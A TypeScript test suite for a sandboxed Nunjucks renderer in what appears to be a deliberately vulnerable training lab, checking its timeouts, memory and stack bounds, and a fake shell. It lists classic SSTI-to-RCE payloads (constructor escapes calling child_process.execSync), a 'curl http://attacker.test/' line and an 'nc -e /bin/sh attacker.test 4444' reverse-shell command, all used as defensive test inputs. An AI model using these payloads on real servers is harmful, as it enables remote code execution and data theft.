// The SSTI sandbox (src/core/ssti/, engine task E4): Nunjucks inside a fresh QuickJS-WASM instance per render, with
// a fake child_process. These cases run on the in-thread transport (the same engine as the worker, on this thread);
// tests/ssti-worker.spec.ts runs the worker and checks that both transports answer the same, and
// tests/ssti-guard.spec.ts proves the host side reaches no filesystem, network, process or vm function.
import { readFileSync } from 'node:fs';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  FAKE_HOST, SSTI_LIMITS, fakeShell, inThreadTransport, renderInSandbox, setSandboxTransport,
  type SandboxInput, type SandboxTransport, type SstiResult,
} from '../src/core/ssti/sandbox.js';
import { instanceMemory } from '../src/core/ssti/engine.js';

let prev: SandboxTransport | undefined;
const inThread = inThreadTransport();
beforeAll(() => { prev = setSandboxTransport(inThread); });
afterAll(async () => {
  setSandboxTransport(prev);
  await inThread.close();
});

const FLAG = 'HVWA{planted-flag-for-this-player}';
const ENV_FLAG = 'HVWA{planted-env-flag}';
/** What FP-07 plants: the flag file, and the same idea through process.env. */
const NODE = { files: { '/srv/forum/flag': `${FLAG}\n` }, env: { FLAG: ENV_FLAG } } as const;
const render = (template: string, extra: Omit<SandboxInput, 'template'> = {}): Promise<SstiResult> => renderInSandbox({ template, ...extra });
/** `{{ range.constructor("<js>")() }}`: run `js` as a function body (the classic escape; `js` must not contain `"`). */
const js = (body: string) => `{{ range.constructor("${body}")() }}`;
/** What a deadline may overrun by on a loaded machine (a fresh instance and Nunjucks' boot come first): only an
 *  interrupted loop ever ends, so any finite bound proves the interrupt; this one proves it fired near the deadline. */
const SLACK_MS = 600;
/** Memory cases get the longest deadline, so the memory bound (not the clock) is what stops them. */
const LONG = { timeoutMs: SSTI_LIMITS.maxTimeoutMs } as const;
const timed = async (template: string, extra: Omit<SandboxInput, 'template'> = {}) => {
  const t = performance.now();
  const r = await render(template, extra);
  return { r, ms: performance.now() - t };
};

describe('renderInSandbox: Nunjucks inside QuickJS', () => {
  it('renders a template with its context', async () => {
    expect(await render('Hi {{ user.name }}, {{ 7 * 7 }}', { ctx: { user: { name: 'pilgrim' } } }))
      .toEqual({ ok: true, output: 'Hi pilgrim, 49', shellCalls: [] });
  });

  it('autoescapes by default; a level may turn it off', async () => {
    const ctx = { name: '<b>x</b>' };
    expect((await render('{{ name }}', { ctx })).output).toBe('&lt;b&gt;x&lt;/b&gt;');
    expect((await render('{{ name }}', { ctx, autoescape: false })).output).toBe('<b>x</b>');
  });

  it('context values are data: template syntax inside them is printed, never evaluated (the Divine shape)', async () => {
    const payload = `{{ 7*7 }} {% for i in range(0, 3) %}x{% endfor %} ${js("return 1")}`;
    const r = await render('Welcome, {{ name }}!', { ctx: { name: payload }, autoescape: false });
    expect(r).toEqual({ ok: true, output: `Welcome, ${payload}!`, shellCalls: [] });
  });

  it('a template error is { ok: false, error } with Nunjucks\' own message and no limit', async () => {
    const r = await render('{{ foo( }}');
    expect(r.ok).toBe(false);
    expect(r.limit).toBeUndefined();
    expect(r.error).toMatch(/^Template render error: \(unknown path\) \[Line 1, Column \d+\]\n {2}unexpected token/);
    expect(r.output).toBeUndefined();
  });

  it('include, import and extends find nothing: the environment has no loaders', async () => {
    for (const t of ['{% include "/etc/passwd" %}', '{% import "../../server.js" as s %}', '{% extends "/srv/forum/views/layout.njk" %}']) {
      const r = await render(t);
      expect(r.ok, t).toBe(false);
      expect(r.error, t).toMatch(/template not found/);
    }
  });

  it('the error message the template controls is clipped inside the sandbox', async () => {
    const r = await render(js("throw 'x'.repeat(100000)"));
    expect(r.ok).toBe(false);
    expect(r.error?.length).toBeLessThanOrEqual(SSTI_LIMITS.errorChars);
  });

  it('a template that tampers with String.prototype never gets an over-long string copied out', async () => {
    // The runner's clip and Nunjucks' output both call String methods the template can replace; the host checks the
    // primitive's own length (which no prototype can change) before it copies anything.
    const tamper = `{% set _ = range.constructor("String.prototype.substring = function () { return this + this }; Object.defineProperty(String.prototype, 'length', { get: function () { return 1 } })")() %}`;
    const big = await render(`${tamper}{% for i in range(0, 2000) %}xxxxxxxxxx{% endfor %}`);
    expect(big).toMatchObject({ ok: false, limit: 'output' });
    const err = await render(`${tamper}${js("throw 'y'.repeat(100000)")}`);
    expect(err).toMatchObject({ ok: false, error: 'The template failed.' });
  });
});

describe('input bounds and malformed calls', () => {
  it('a template longer than SSTI_LIMITS.templateChars is refused before it crosses (limit: input)', async () => {
    const atCap = `{{ 1 }}${'x'.repeat(SSTI_LIMITS.templateChars - 7)}`;
    expect((await render(atCap)).ok).toBe(true);
    expect(await render(`${atCap}x`)).toEqual({
      ok: false, limit: 'input', error: `The template is too long (at most ${SSTI_LIMITS.templateChars} characters).`, shellCalls: [],
    });
  });

  it('a context over SSTI_LIMITS.ctxChars as JSON is refused (limit: input): a Divine level passes player input as data', async () => {
    const r = await render('{{ name }}', { ctx: { name: 'x'.repeat(SSTI_LIMITS.ctxChars) } });
    expect(r).toMatchObject({ ok: false, limit: 'input' });
  });

  it('a malformed call is a lab bug and throws', () => {
    const bad: unknown[] = [
      undefined, null, 'x', { template: 1 }, { template: 'x', ctx: [] }, { template: 'x', ctx: { f: () => 1 } },
      { template: 'x', ctx: { d: new Date() } }, { template: 'x', ctx: { n: Number.NaN } }, { template: 'x', ctx: { u: undefined } },
      { template: 'x', ctx: { b: 1n } }, { template: 'x', timeoutMs: 0 }, { template: 'x', timeoutMs: SSTI_LIMITS.maxTimeoutMs + 1 },
      { template: 'x', timeoutMs: 1.5 }, { template: 'x', autoescape: 'yes' }, { template: 'x', node: null },
      { template: 'x', node: { files: { 'relative/flag': 'x' } } }, { template: 'x', node: { files: { '/f': 1 } } },
      { template: 'x', node: { files: { '/f': 'x'.repeat(SSTI_LIMITS.nodeFileChars + 1) } } },
      { template: 'x', node: { files: Object.fromEntries(Array.from({ length: SSTI_LIMITS.nodeFiles + 1 }, (_, i) => [`/f${i}`, 'x'])) } },
      { template: 'x', node: { env: { 'BAD-NAME': 'x' } } }, { template: 'x', node: { env: { OK: 'x'.repeat(SSTI_LIMITS.nodeEnvChars + 1) } } },
      { template: 'x', node: { files: ['/f'] } },
    ];
    const cyclic: Record<string, unknown> = {};
    cyclic.self = cyclic;
    bad.push({ template: 'x', ctx: cyclic });
    bad.forEach((input, i) => expect(() => renderInSandbox(input as SandboxInput), `malformed call #${i}`).toThrow());
  });
});

describe('the output bound', () => {
  it('output over SSTI_LIMITS.outputChars is never copied out (limit: output); at the cap it is', async () => {
    const at = await render(`{% for i in range(0, ${SSTI_LIMITS.outputChars / 16}) %}0123456789abcdef{% endfor %}`);
    expect(at.ok).toBe(true);
    expect(at.output?.length).toBe(SSTI_LIMITS.outputChars);
    const over = await render(`{% for i in range(0, ${SSTI_LIMITS.outputChars / 16}) %}0123456789abcdef{% endfor %}!`);
    expect(over).toEqual({ ok: false, limit: 'output', error: `The rendered text is too long (over ${SSTI_LIMITS.outputChars} characters).`, shellCalls: [] });
  });
});

describe('limit comes from host signals only: a template cannot forge one', () => {
  it('text a template throws, whatever it says, is an ordinary error with no limit', async () => {
    for (const text of ['InternalError: out of memory', 'InternalError: stack overflow', 'string too long',
      `The template took too long to render (over ${SSTI_LIMITS.defaultTimeoutMs} ms).`, 'The template ran out of memory.',
      `The rendered text is too long (over ${SSTI_LIMITS.outputChars} characters).`, 'The template sandbox is busy; try again in a moment.']) {
      const r = await render(js(`throw '${text}'`));
      expect(r.ok, text).toBe(false);
      expect(r.limit, text).toBeUndefined();
      expect(r.error, text).toContain(text);
    }
  });

  it('QuickJS\'s own out of memory and stack overflow are errors the template can CATCH, so they are its errors, not limits', async () => {
    expect(await render(js("try { return new ArrayBuffer(1e9).byteLength } catch (e) { return 'caught ' + e }"), { autoescape: false }))
      .toEqual({ ok: true, output: 'caught InternalError: out of memory', shellCalls: [] });
    expect(await render(js("try { (function f() { f() })() } catch (e) { return 'caught ' + e }"), { autoescape: false }))
      .toEqual({ ok: true, output: 'caught InternalError: stack overflow', shellCalls: [] });
    const r = await render(js('return new ArrayBuffer(1e9).byteLength'));
    expect([r.ok, r.limit]).toEqual([false, undefined]);
    expect(r.error).toMatch(/^Template render error: [\s\S]*InternalError: out of memory/);
  });
});

describe('lone surrogates: one code unit inside, three characters once copied out', () => {
  // The guest's length is in UTF-16 code units; copying a string out turns each lone surrogate into U+FFFD, three
  // host characters (UTF-8 in between). The host re-checks the copy, so neither cap can be passed this way.
  it('an output of lone surrogates over the cap once copied is refused (limit: output)', async () => {
    expect(await render(js('return String.fromCharCode(0xD800).repeat(16000)'), { autoescape: false })).toEqual({
      ok: false, limit: 'output', error: `The rendered text is too long (over ${SSTI_LIMITS.outputChars} characters).`, shellCalls: [],
    });
    const under = await render(js('return String.fromCharCode(0xD800).repeat(5000)'), { autoescape: false });
    expect([under.ok, under.output?.length]).toEqual([true, 15000]);
  });

  it('a shell command of lone surrogates that grows past its cap once copied is refused as too long', async () => {
    const r = await render(js("try { return process.mainModule.require('child_process').execSync(String.fromCharCode(0xD800).repeat(400)) } catch (e) { return e.status + ' ' + e.stderr }"), { node: NODE });
    expect(r).toEqual({ ok: true, output: '2 sh: 1: command too long', shellCalls: ['(an over-long command)'] });
  });

  it('an error message of lone surrogates is clipped to SSTI_LIMITS.errorChars once copied', async () => {
    const r = await render(js('throw String.fromCharCode(0xDC00).repeat(450)'));
    expect(r.ok).toBe(false);
    expect(r.limit).toBeUndefined();
    expect(r.error).toMatch(/^Template render error: /);
    expect(r.error?.length).toBeLessThanOrEqual(SSTI_LIMITS.errorChars);
  });
});

describe('the deadline: QuickJS\'s interrupt handler', () => {
  const timeout = (ms: number) => ({ ok: false, limit: 'timeout', error: `The template took too long to render (over ${ms} ms).` });

  it('an infinite loop is interrupted at the deadline', async () => {
    const { r, ms } = await timed(js('while (true) {}'));
    expect(r).toMatchObject(timeout(SSTI_LIMITS.defaultTimeoutMs));
    expect(ms).toBeLessThan(SSTI_LIMITS.defaultTimeoutMs + SLACK_MS);
  });

  it('a Nunjucks-only loop ({% for %} over range) is interrupted too', async () => {
    const { r, ms } = await timed('{% for i in range(0, 100000) %}{% for j in range(0, 100000) %}{% endfor %}{% endfor %}');
    expect(r).toMatchObject(timeout(SSTI_LIMITS.defaultTimeoutMs));
    expect(ms).toBeLessThan(SSTI_LIMITS.defaultTimeoutMs + SLACK_MS);
  });

  it('catastrophic regex backtracking is interrupted (QuickJS checks the deadline inside the regex engine)', async () => {
    const { r, ms } = await timed(js("return /(a+)+$/.test('a'.repeat(40) + 'b')"));
    expect(r).toMatchObject(timeout(SSTI_LIMITS.defaultTimeoutMs));
    expect(ms).toBeLessThan(SSTI_LIMITS.defaultTimeoutMs + SLACK_MS);
  });

  it('a lab may pass a shorter deadline', async () => {
    const { r, ms } = await timed(js('for (;;) {}'), { timeoutMs: 50 });
    expect(r).toMatchObject(timeout(50));
    expect(ms).toBeLessThan(50 + SLACK_MS);
  });

  it('a render that ends after its deadline yields no output, even when a native call kept the interrupt from firing', async () => {
    // One native call of about 60 ms (String.prototype.indexOf over 15 M characters) runs with no interrupt check.
    expect(await render(js("return 'a'.repeat(15000000).indexOf('b')"), { timeoutMs: 20 })).toMatchObject(timeout(20));
  });
});

describe('memory: three layers, each seen alone', () => {
  const stopped = { ok: false, limit: 'memory', error: 'The template ran out of memory.' };
  const MiB = 1024 * 1024;

  it('1. the interrupt handler stops a render once its WASM memory passes 28 MiB: uncatchable, a host signal (limit: memory)', async () => {
    // Without it, many small allocations reach QuickJS's limit with no room left for the error object: QuickJS throws
    // null and Nunjucks reports a TypeError. The interrupt cannot be caught, so the try/catch sees nothing.
    for (const t of [js('var a = []; while (true) a.push({ i: a.length })'),
      js("try { var a = []; while (true) a.push({ i: a.length }) } catch (e) { return 'caught ' + e }"),
      '{% set a = [] %}{% for i in range(0, 1000) %}{% set _ = a.push(range(0, 100000)) %}{% endfor %}']) {
      expect(await render(t, LONG), t).toEqual({ ...stopped, shellCalls: [] });
    }
  });

  it('2. QuickJS\'s own 32 MiB allocation limit, alone: a 30 MiB buffer fits, 33 MiB (inside the 48 MiB WASM memory) is refused', async () => {
    expect(await render(js(`return new ArrayBuffer(${30 * MiB}).byteLength`), LONG)).toEqual({ ok: true, output: String(30 * MiB), shellCalls: [] });
    // A refused allocation is an error the template sees (and could catch): its error, not a limit.
    const r = await render(js(`return new ArrayBuffer(${33 * MiB}).byteLength`), LONG);
    expect([r.ok, r.limit]).toEqual([false, undefined]);
    expect(r.error).toMatch(/InternalError: out of memory$/);
  });

  it('2. one huge allocation, or a loop of big ones, is refused the same way, at once', async () => {
    for (const body of ["return 'x'.repeat(1e9).length", 'return new ArrayBuffer(1e9).byteLength', 'return new Array(1e9).fill(0).length',
      'var a = []; while (true) a.push(new ArrayBuffer(1 << 20))']) {
      const r = await render(js(body), LONG);
      expect([r.ok, r.limit], body).toEqual([false, undefined]);
      expect(r.error, body).toMatch(/InternalError: out of memory$/);
    }
    const doubling = await render('{% set s = "xxxxxxxxxx" %}{% for i in range(0, 40) %}{% set s = s + s %}{% endfor %}{{ s | length }}', LONG);
    expect([doubling.ok, doubling.limit]).toEqual([false, undefined]);
    expect(doubling.error).toMatch(/InternalError: string too long$/);
  });

  it('3. an instance\'s WebAssembly.Memory starts at 16 MiB and can never grow past 48 MiB (the backstop the other two always reach first)', () => {
    const memory = instanceMemory();
    expect(memory.buffer.byteLength).toBe(SSTI_LIMITS.wasmInitialBytes);
    memory.grow((SSTI_LIMITS.wasmMaxBytes - SSTI_LIMITS.wasmInitialBytes) / 65536);
    expect(memory.buffer.byteLength).toBe(SSTI_LIMITS.wasmMaxBytes);
    expect(() => memory.grow(1)).toThrow(RangeError);
    // And it is the memory every render gets: the engine makes WebAssembly.Memory in this one place.
    const engine = readFileSync(new URL('../src/core/ssti/engine.ts', import.meta.url), 'utf8');
    expect(engine.match(/new WebAssembly\.Memory\(/g)).toHaveLength(1);
    expect(engine).toMatch(/const memory = instanceMemory\(\);/);
  });
});

describe('the stack', () => {
  it('QuickJS\'s 128 KiB stack: deep recursion is a CATCHABLE InternalError, well before 1000 frames', async () => {
    const r = await render(js("var d = 0; try { (function f() { d++; f() })() } catch (e) { return (e instanceof InternalError) + ' ' + e.message + ' ' + d } return 'no limit'"), { autoescape: false });
    const m = /^true stack overflow (\d+)$/.exec(r.output ?? '');
    expect(m, r.output ?? r.error).not.toBeNull();
    expect(Number(m?.[1])).toBeGreaterThan(200);
    expect(Number(m?.[1])).toBeLessThan(1000);
  });

  it('so recursion, a recursive macro and deeply nested template syntax are the template\'s own errors, never a host crash', async () => {
    const depth = (SSTI_LIMITS.templateChars - 8) / 2;
    for (const t of [js('(function f() { f() })()'), '{% macro m(n) %}{{ m(n + 1) }}{% endmacro %}{{ m(0) }}',
      `{{ ${'('.repeat(depth)}1${')'.repeat(depth)} }}`]) {
      const r = await render(t);
      expect([r.ok, r.limit], t.slice(0, 60)).toEqual([false, undefined]);
      expect(r.error, t.slice(0, 60)).toMatch(/InternalError: stack overflow$/);
    }
  });

  it('a native stack overflow under QuickJS (this thread\'s 1 MB stack: JSON.stringify of a deep value) is a host signal (limit: stack)', async () => {
    expect(await render(js('var a = []; for (var i = 0; i < 200000; i++) a = [a]; return JSON.stringify(a).length'))).toEqual({
      ok: false, limit: 'stack', error: 'The template nested or recursed too deeply (stack overflow).', shellCalls: [],
    });
  });
});

describe('no host reach', () => {
  const HOST_NAMES = ['process', 'require', 'module', 'exports', 'Buffer', 'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource',
    'setTimeout', 'setInterval', 'setImmediate', 'queueMicrotask', 'console', 'WebAssembly', 'Deno', 'Bun', 'global', 'std', 'os',
    'scriptArgs', 'print', 'navigator', 'window', 'self'];

  it('without a planted host, none of the host\'s globals exist in the sandbox', async () => {
    const r = await render(js(`return [${HOST_NAMES.map((n) => `typeof ${n}`).join(', ')}].join(',')`));
    expect(r).toEqual({ ok: true, output: HOST_NAMES.map(() => 'undefined').join(','), shellCalls: [] });
  });

  /** QuickJS's own globals (the language), exactly: anything more is a binding someone added. */
  const LANGUAGE = ['AggregateError', 'Array', 'ArrayBuffer', 'BigInt', 'BigInt64Array', 'BigUint64Array', 'Boolean', 'DataView',
    'Date', 'Error', 'EvalError', 'FinalizationRegistry', 'Float16Array', 'Float32Array', 'Float64Array', 'Function', 'Infinity',
    'Int16Array', 'Int32Array', 'Int8Array', 'InternalError', 'Iterator', 'JSON', 'Map', 'Math', 'NaN', 'Number', 'Object',
    'Promise', 'Proxy', 'RangeError', 'ReferenceError', 'Reflect', 'RegExp', 'Set', 'SharedArrayBuffer', 'String', 'Symbol',
    'SyntaxError', 'TypeError', 'URIError', 'Uint16Array', 'Uint32Array', 'Uint8Array', 'Uint8ClampedArray', 'WeakMap', 'WeakRef',
    'WeakSet', 'decodeURI', 'decodeURIComponent', 'encodeURI', 'encodeURIComponent', 'escape', 'eval', 'globalThis', 'isFinite',
    'isNaN', 'parseFloat', 'parseInt', 'undefined', 'unescape'];
  const globalNames = async (extra: Omit<SandboxInput, 'template'> = {}) =>
    (await render(js("return Object.getOwnPropertyNames(Function('return this')()).sort().join(',')"), { autoescape: false, ...extra })).output?.split(',');

  it('the sandbox global holds EXACTLY the language and nunjucks; a planted host adds exactly process and global', async () => {
    expect(await globalNames()).toEqual([...LANGUAGE, 'nunjucks'].sort());
    expect(await globalNames({ node: NODE })).toEqual([...LANGUAGE, 'nunjucks', 'process', 'global'].sort());
  });

  it('the fake process, its mainModule and its child_process have exactly these members (execSync the only door)', async () => {
    const shape = js("var cp = process.mainModule.require('child_process'); return [process, process.mainModule, cp].map(function (o) { return Object.getOwnPropertyNames(o).sort().join(',') }).join(' | ')");
    expect((await render(shape, { node: NODE, autoescape: false })).output).toBe(
      'arch,argv,cwd,env,execPath,mainModule,pid,platform,title,version,versions | filename,id,loaded,paths,require | execSync');
  });

  it('the fake require knows child_process (as node:child_process too) and no other module', async () => {
    const MODULES = ['child_process', 'node:child_process', 'fs', 'node:fs', 'fs/promises', 'os', 'node:os', 'path', 'net', 'http',
      'https', 'http2', 'tls', 'dgram', 'dns', 'vm', 'worker_threads', 'process', 'module', 'crypto', 'util', 'events', 'buffer',
      'inspector', 'v8', 'cluster', 'repl', 'readline', 'zlib', 'stream', 'url', 'querystring', 'assert', 'perf_hooks', 'timers'];
    const list = MODULES.map((m) => `'${m}'`).join(',');
    const r = await render(js(`var ok = []; [${list}].forEach(function (m) { try { process.mainModule.require(m); ok.push(m) } catch (e) {} }); return ok.join(',')`), { node: NODE });
    expect(r.output).toBe('child_process,node:child_process');
  });

  it('the usual ways to name process, require or a module fail', async () => {
    for (const [t, re] of [
      ["{{ range.constructor(\"return globalThis.constructor('return process')()\")() }}", /not a function/],
      [js('return process'), /'process' is not defined/],
      [js('return require'), /'require' is not defined/],
      [js("return Function('return this')().process.env"), /cannot read property 'env' of undefined/i],
      ['{{ "".__proto__.constructor.constructor("return process.mainModule")() }}', /'process' is not defined/],
    ] as const) {
      const r = await render(t);
      expect(r.ok, t).toBe(false);
      expect(r.error, t).toMatch(re);
    }
  });

  it('import() has no module loader: it only makes a promise that never settles in the render', async () => {
    expect(await render(js("var p = import('node:fs'); return Object.prototype.toString.call(p)")))
      .toEqual({ ok: true, output: '[object Promise]', shellCalls: [] });
  });

  it('with a planted host, process is the FAKE: its own version, cwd, env and require, nothing of the real one', async () => {
    const r = await render(js("return [process.version, process.pid, process.cwd(), process.platform, typeof process.binding, typeof process.exit, typeof process.kill, typeof require, Object.keys(process.env).sort().join('+')].join(' ')"), { node: NODE });
    expect(r).toEqual({ ok: true, output: 'v22.22.0 1 /srv/forum linux undefined undefined undefined undefined FLAG+HOME+NODE_ENV+PATH+PWD+USER', shellCalls: [] });
    const fs = await render(js("return process.mainModule.require('fs')"), { node: NODE });
    expect(fs.error).toMatch(/Cannot find module 'fs'/);
    expect((await render(js("return process.env.HOME + ' ' + process.env.USER"), { node: NODE })).output).toBe(`${FAKE_HOST.home} ${FAKE_HOST.user}`);
  });
});

describe('classic SSTI -> RCE payloads reach only the fake bridge', () => {
  const exec = (cmd: string) => `process.mainModule.require('child_process').execSync('${cmd}')`;
  const PAYLOADS: readonly string[] = [
    `{{ range.constructor("return global.${exec('cat /srv/forum/flag')}")() }}`,
    `{{ cycler.constructor("return ${exec('cat /srv/forum/flag')}.toString()")() }}`,
    `{{ joiner.constructor("return ${exec('cat /srv/forum/flag')}")() }}`,
    `{{ "".__proto__.constructor.constructor("return ${exec('cat /srv/forum/flag')}")() }}`,
    `{{ [].__proto__.constructor.constructor("return ${exec('cat /srv/forum/flag')}")() }}`,
    `{{ range["constr" ~ "uctor"]("return ${exec('cat /srv/forum/flag')}")() }}`,
    `{% set f = cycler.constructor %}{{ f("return ${exec('cd /srv/forum && cat flag')}")() }}`,
    `{{ range.constructor("return ${exec('cat flag')}")() }}`,
  ];

  for (const payload of PAYLOADS) {
    it(`${payload.slice(0, 70)}... prints the planted flag and nothing ran`, async () => {
      const r = await render(payload, { node: NODE });
      expect(r.ok).toBe(true);
      expect(r.output?.trim()).toBe(FLAG);
      expect(r.shellCalls).toHaveLength(1);
      expect(r.shellCalls[0]).toMatch(/^(cat \/srv\/forum\/flag|cd \/srv\/forum && cat flag|cat flag)$/);
    });
  }

  it('process.env.FLAG is the other planted path', async () => {
    expect(await render('{{ cycler.constructor("return process.env.FLAG")() }}', { node: NODE }))
      .toEqual({ ok: true, output: ENV_FLAG, shellCalls: [] });
  });

  it('without a planted host the same payload finds no process, and no flag exists in the sandbox', async () => {
    const r = await render(PAYLOADS[0]);
    expect(r).toMatchObject({ ok: false, shellCalls: [] });
    expect(r.error).toMatch(/'global' is not defined/);
  });

  it('the canary comes back ONLY for the planted path: anything else is the fake machine\'s ordinary answer', async () => {
    const out = async (cmd: string) => (await render(`{{ range.constructor("return ${exec(cmd)}")() }}`, { node: NODE }));
    expect((await out('id')).output).toBe(`uid=${FAKE_HOST.uid}(${FAKE_HOST.user}) gid=${FAKE_HOST.uid}(${FAKE_HOST.user}) groups=${FAKE_HOST.uid}(${FAKE_HOST.user})\n`);
    expect((await out('cat /etc/passwd')).output).toMatch(/^root:x:0:0:root:\/root:\/bin\/sh\nscribe:x:1000:1000::\/home\/scribe:\/bin\/sh\n$/);
    expect((await out('ls /srv/forum')).output).toBe('flag\n');
    const missing = await out('cat /srv/forum/flag.txt');
    expect(missing.ok).toBe(false);
    expect(missing.error).toMatch(/Command failed: cat \/srv\/forum\/flag\.txt\ncat: \/srv\/forum\/flag\.txt: No such file or directory/);
    const unknown = await out('curl http://attacker.test/');
    expect(unknown.error).toMatch(/sh: 1: curl: not found/);
    for (const r of [await out('id'), await out('ls /'), missing, unknown]) expect(JSON.stringify(r)).not.toContain(FLAG);
  });

  it('execSync throws like Node\'s for a failing command, with status, stdout and stderr', async () => {
    const r = await render(`{{ range.constructor("try { ${exec('cat /nope')} } catch (e) { return [e.status, JSON.stringify(e.stdout), e.stderr].join('|') }")() }}`, { node: NODE, autoescape: false });
    expect(r).toEqual({ ok: true, output: '1|""|cat: /nope: No such file or directory', shellCalls: ['cat /nope'] });
  });

  it('shellCalls records each command in order: the first 16, each clipped; past 64 a render cannot fork', async () => {
    const long = `echo ${'x'.repeat(300)}`;
    const r = await render(`{{ range.constructor("var cp = process.mainModule.require('child_process'); cp.execSync('id'); cp.execSync('${long}'); for (var i = 0; i < 70; i++) { try { cp.execSync('echo ' + i) } catch (e) { return e.message } } return 'all ran'")() }}`, { node: NODE });
    expect(r.output).toBe('Command failed: echo 62\nsh: 1: Cannot fork');
    expect(r.shellCalls).toHaveLength(SSTI_LIMITS.shellCallsKept);
    expect(r.shellCalls[0]).toBe('id');
    expect(r.shellCalls[1]).toBe(long.slice(0, SSTI_LIMITS.shellCallChars));
    expect(r.shellCalls[2]).toBe('echo 0');
  });

  it('an over-long command is refused without being copied out of the sandbox', async () => {
    const r = await render(`{{ range.constructor("try { process.mainModule.require('child_process').execSync('echo ' + 'x'.repeat(${SSTI_LIMITS.shellCommandChars})) } catch (e) { return e.status + ' ' + e.stderr }")() }}`, { node: NODE });
    expect(r).toEqual({ ok: true, output: '2 sh: 1: command too long', shellCalls: ['(an over-long command)'] });
  });
});

describe('fakeShell: a tiny allow-list over the planted machine', () => {
  const node = { files: { '/srv/forum/flag': 'F\n', '/srv/forum/notes/todo.txt': 'pray\n' }, env: { FLAG: 'E' } };
  const sh = (cmd: string) => fakeShell(node, cmd);
  const ok = (stdout: string) => ({ status: 0, stdout, stderr: '' });

  it('answers the allow-listed commands from the planted files and environment', () => {
    expect(sh('whoami')).toEqual(ok('scribe\n'));
    expect(sh('hostname')).toEqual(ok('forum-of-pilgrims\n'));
    expect(sh('pwd')).toEqual(ok('/srv/forum\n'));
    expect(sh('uname')).toEqual(ok('Linux\n'));
    expect(sh('uname -a').stdout).toMatch(/^Linux forum-of-pilgrims .* GNU\/Linux\n$/);
    expect(sh('ls')).toEqual(ok('flag\nnotes\n'));
    expect(sh('ls -la /srv/forum/notes')).toEqual(ok('todo.txt\n'));
    expect(sh('ls /')).toEqual(ok('etc\nhome\nsrv\ntmp\n'));
    expect(sh('cat flag notes/todo.txt ../forum/./flag')).toEqual(ok('F\npray\nF\n'));
    expect(sh('printenv FLAG')).toEqual(ok('E\n'));
    expect(sh('env').stdout).toContain('FLAG=E\n');
    expect(sh('echo $FLAG "${HOME}" \'$FLAG\' \\$x')).toEqual(ok('E /home/scribe $FLAG $x\n'));
  });

  it('runs simple sequences (;, &&, ||, newlines) and cd within one command line', () => {
    expect(sh('id; whoami')).toEqual(ok('uid=1000(scribe) gid=1000(scribe) groups=1000(scribe)\nscribe\n'));
    expect(sh('cd /srv/forum/notes && cat todo.txt')).toEqual(ok('pray\n'));
    expect(sh('cat /nope && echo never')).toMatchObject({ status: 1, stdout: '' });
    expect(sh('cat /nope || echo fallback')).toEqual({ status: 0, stdout: 'fallback\n', stderr: 'cat: /nope: No such file or directory' });
    expect(sh('whoami\npwd')).toEqual(ok('scribe\n/srv/forum\n'));
  });

  it('the allow-list is exactly these commands: every other name is "not found"', () => {
    const ALLOWED = ['cat', 'cd', 'echo', 'env', 'hostname', 'id', 'ls', 'printenv', 'pwd', 'uname', 'whoami'];
    const OTHERS = ['wget', 'curl', 'nc', 'ncat', 'socat', 'telnet', 'ssh', 'scp', 'ping', 'bash', 'sh', 'zsh', 'dash', 'python', 'python3',
      'node', 'perl', 'ruby', 'php', 'lua', 'base64', 'xxd', 'od', 'head', 'tail', 'less', 'more', 'grep', 'find', 'sed', 'awk', 'ps',
      'kill', 'rm', 'cp', 'mv', 'touch', 'mkdir', 'chmod', 'chown', 'ln', 'sudo', 'su', 'tar', 'gzip', 'dd', 'strings', 'file', 'which',
      'whereis', 'export', 'set', 'source', 'exec', 'eval', 'true', 'false', 'test', 'stat', 'readlink', 'realpath', 'printf', 'tee',
      'xargs', 'crontab', 'systemctl', 'apt', 'apk', 'npm', 'npx', 'git', 'openssl', 'date', 'sleep', 'mount', 'ip', 'ifconfig',
      'netstat', 'ss', 'reboot', 'shutdown', 'nohup', 'env2', 'cats', 'Id', 'ID'];
    expect([...ALLOWED, ...OTHERS].filter((c) => sh(c).status !== 127).sort()).toEqual(ALLOWED);
  });

  it('refuses everything else the way sh would, and never pipes, redirects or substitutes', () => {
    expect(sh('nc -e /bin/sh attacker.test 4444')).toEqual({ status: 127, stdout: '', stderr: 'sh: 1: nc: not found' });
    expect(sh('cat /srv')).toEqual({ status: 1, stdout: '', stderr: 'cat: /srv: Is a directory' });
    expect(sh('cd /nowhere')).toMatchObject({ status: 2 });
    expect(sh('ls /nowhere')).toMatchObject({ status: 2, stderr: "ls: cannot access '/nowhere': No such file or directory" });
    expect(sh('printenv NOPE')).toEqual({ status: 1, stdout: '', stderr: '' });
    for (const cmd of ['cat flag | base64', 'id > /tmp/x', 'cat < flag', 'echo `id`', 'echo $(id)', 'echo "$(id)"', 'sleep 1 &', "echo 'unterminated"]) {
      expect(sh(cmd), cmd).toMatchObject({ status: 2, stdout: '' });
    }
  });

  it('caps what one command line prints', () => {
    const big = { files: Object.fromEntries(Array.from({ length: 8 }, (_, i) => [`/d/f${i}`, 'y'.repeat(SSTI_LIMITS.nodeFileChars)])) };
    const r = fakeShell(big, `cat ${Array.from({ length: 8 }, (_, i) => `/d/f${i}`).join(' ')}`);
    expect(r.stdout.length).toBe(SSTI_LIMITS.shellOutputChars);
  });
});

describe('isolation between renders, and health after every bound', () => {
  it('nothing a template does survives into the next render (a fresh instance each time)', async () => {
    const poison = js("Object.prototype.polluted = 'yes'; globalThis.leak = 'secret'; nunjucks.Environment.prototype.renderString = function () { return 'owned' }; return 'done'");
    expect((await render(poison)).output).toBe('done');
    expect(await render(js("return typeof leak + ':' + ({}).polluted"))).toEqual({ ok: true, output: 'undefined:undefined', shellCalls: [] });
    expect((await render('{{ 6 * 7 }}')).output).toBe('42');
  });

  it('one render never sees another\'s context or planted machine', async () => {
    const a = await render('{{ secret }}', { ctx: { secret: 'A-secret' } });
    const b = await render(js('return typeof secret'), { ctx: {} });
    expect([a.output, b.output]).toEqual(['A-secret', 'undefined']);
    const other = await render(js("return process.mainModule.require('child_process').execSync('cat /srv/forum/flag')"), { node: { files: { '/srv/forum/flag': 'B\n' } } });
    expect(other.output).toBe('B\n');
  });

  it('after a timeout, an allocation bomb, a stack overflow, an output overflow or a template error, the next render is healthy', async () => {
    const failing: readonly [string, string | undefined][] = [
      [js('while (true) {}'), 'timeout'],
      [js('var a = []; while (true) a.push({ i: a.length })'), 'memory'],
      [js('var a = []; while (true) a.push(new ArrayBuffer(1 << 20))'), undefined],
      [js('(function f() { f() })()'), undefined],
